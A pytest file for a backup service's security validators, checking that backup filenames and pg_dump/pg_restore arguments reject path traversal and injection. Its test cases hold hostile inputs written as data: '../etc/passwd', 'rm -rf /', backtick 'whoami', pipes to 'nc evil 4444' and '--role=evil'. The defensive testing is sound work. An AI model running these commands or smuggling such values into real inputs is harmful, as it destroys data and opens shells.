#!/usr/bin/env python3
"""
Unit tests for backup_service.py security hardening.

Closes CodeQL regressions for:
  - py/path-injection (alerts #1183-#1193) on backup filename
  - py/command-line-injection (alerts #1179, #1180) on pg_dump/pg_restore

These tests verify the validators directly. Full integration tests of
BackupService.create_backup / restore_backup require a real PostgreSQL
instance and are covered by the DR Drill workflow (`.github/workflows/dr-drill.yml`).
"""
from __future__ import annotations

import importlib
import sys
from pathlib import Path

import pytest

# Ensure backend/ is importable
BACKEND_DIR = Path(__file__).resolve().parents[2]
if str(BACKEND_DIR) not in sys.path:
    sys.path.insert(0, str(BACKEND_DIR))

# Import the module under test
bs = importlib.import_module("app.services.backup_service")
BackupSecurityError = bs.BackupSecurityError
_validate_backup_filename = bs._validate_backup_filename
_resolve_backup_path = bs._resolve_backup_path
_validate_pg_component = bs._validate_pg_component


# ============================================================
# _validate_backup_filename — closes py/path-injection #1183-#1185
# ============================================================

class TestValidateBackupFilename:
    @pytest.mark.parametrize("name", [
        "backup_manual_20260101_120000.db",
        "backup_scheduled_20260101_120000.db.gz",
        "backup_before_migration_20260101_120000.db",
        "my-backup-1.db",
        "a.b.c.d",
    ])
    def test_accepts_valid_filenames(self, name: str) -> None:
        # Should not raise
        _validate_backup_filename(name)

    @pytest.mark.parametrize("name,reason", [
        ("../etc/passwd", "path traversal"),
        ("..\\windows\\system32", "windows path traversal"),
        ("/etc/passwd", "absolute path"),
        ("subdir/backup.db", "subdirectory"),
        ("backup.db\x00", "nul byte"),
        (".hidden", "leading dot"),
        ("", "empty"),
        (None, "none"),  # type: ignore[arg-type]
        ("x" * 300, "too long"),
        ("backup$", "shell special char"),
        ("backup;rm -rf /", "shell metachar"),
        ("backup`whoami`", "backtick injection"),
        ("backup|nc evil 4444", "pipe injection"),
    ])
    def test_rejects_invalid_filenames(self, name: str, reason: str) -> None:
        with pytest.raises(BackupSecurityError, match="Invalid|forbidden"):
            _validate_backup_filename(name)


# ============================================================
# _resolve_backup_path — closes py/path-injection #1186-#1193
# ============================================================

class TestResolveBackupPath:
    def test_resolves_valid_child(self, tmp_path: Path) -> None:
        result = _resolve_backup_path(tmp_path, "backup.db")
        assert result == (tmp_path / "backup.db").resolve()
        assert tmp_path.resolve() in result.parents

    def test_rejects_traversal(self, tmp_path: Path) -> None:
        with pytest.raises(BackupSecurityError, match="forbidden sequence|escapes"):
            _resolve_backup_path(tmp_path, "../../etc/passwd")

    def test_rejects_absolute_path(self, tmp_path: Path) -> None:
        with pytest.raises(BackupSecurityError, match="forbidden sequence|escapes"):
            _resolve_backup_path(tmp_path, "/etc/passwd")

    def test_rejects_subdir(self, tmp_path: Path) -> None:
        with pytest.raises(BackupSecurityError, match="forbidden sequence|escapes"):
            _resolve_backup_path(tmp_path, "subdir/backup.db")

    def test_rejects_dotdot_in_name(self, tmp_path: Path) -> None:
        with pytest.raises(BackupSecurityError, match="forbidden sequence|escapes"):
            _resolve_backup_path(tmp_path, "backup..db")


# ============================================================
# _validate_pg_component — closes py/command-line-injection #1179, #1180
# ============================================================

class TestValidatePgComponent:
    @pytest.mark.parametrize("value,kind", [
        ("localhost", "hostname"),
        ("db.example.com", "hostname"),
        ("postgres", "username"),
        ("app_user", "username"),
        ("clinic_db", "database"),
        ("", "hostname"),
        ("", "username"),
        ("", "database"),
        (None, "hostname"),
    ])
    def test_accepts_valid_components(self, value: str | None, kind: str) -> None:
        # Should not raise; empty/None returns ""
        result = _validate_pg_component(value, kind)
        if not value:
            assert result == ""
        else:
            assert result == value

    @pytest.mark.parametrize("value,kind", [
        ("--role=evil", "username"),       # argument injection via DATABASE_URL
        ("-d", "database"),                 # argument injection
        ("--", "hostname"),
        ("db; rm -rf /", "database"),       # shell metachar
        ("user$()", "username"),            # command substitution
        ("db`whoami`", "database"),         # backtick
        ("db|nc evil 4444", "database"),    # pipe
    ])
    def test_rejects_argument_injection(self, value: str, kind: str) -> None:
        with pytest.raises(BackupSecurityError, match="argument injection|forbidden"):
            _validate_pg_component(value, kind)

    def test_unknown_kind_passes_through(self) -> None:
        # Unknown kind: still rejects leading '-' but skips pattern match
        with pytest.raises(BackupSecurityError, match="argument injection"):
            _validate_pg_component("-evil", "unknown_kind")
        # Non-leading-dash value passes through (no pattern check)
        assert _validate_pg_component("anything", "unknown_kind") == "anything"


# ============================================================
# End-to-end: BackupService methods reject malicious filenames
# ============================================================

class TestBackupServiceRejectsMaliciousFilename:
    """Verify that restore_backup / verify_backup raise BackupSecurityError
    (not FileNotFoundError) when given a path-traversal filename.

    This is the regression test that would fail if the validators were
    removed accidentally.
    """

    def _make_service(self, tmp_path: Path):
        # BackupService.__init__ requires a Session, but we only test the
        # methods that don't actually use it. Construct via __new__ to avoid
        # the SQLAlchemy dependency.
        svc = bs.BackupService.__new__(bs.BackupService)
        svc.backup_dir = tmp_path
        svc.retention_days = 30
        svc.max_backups = 100
        return svc

    def test_restore_backup_rejects_traversal(self, tmp_path: Path) -> None:
        """restore_backup re-raises (its except-Exception block calls `raise`).
        The error is logged then propagated."""
        svc = self._make_service(tmp_path)
        with pytest.raises(BackupSecurityError, match="forbidden sequence|escapes"):
            svc.restore_backup("../../etc/passwd")

    def test_verify_backup_rejects_traversal(self, tmp_path: Path) -> None:
        """verify_backup catches Exception and returns {'valid': False, 'error': ...}.
        The BackupSecurityError is raised by _resolve_backup_path BEFORE any
        filesystem access — so the traversal is blocked and only an error
        message is returned (no file metadata leak)."""
        svc = self._make_service(tmp_path)
        result = svc.verify_backup("../../etc/passwd")
        assert result["valid"] is False
        assert "Invalid backup filename" in result["error"] or "forbidden" in result["error"]

    def test_restore_backup_rejects_absolute(self, tmp_path: Path) -> None:
        svc = self._make_service(tmp_path)
        with pytest.raises(BackupSecurityError, match="forbidden sequence|escapes"):
            svc.restore_backup("/etc/passwd")

    def test_verify_backup_rejects_subdir(self, tmp_path: Path) -> None:
        svc = self._make_service(tmp_path)
        result = svc.verify_backup("subdir/backup.db")
        assert result["valid"] is False
        assert "Invalid backup filename" in result["error"] or "forbidden" in result["error"]
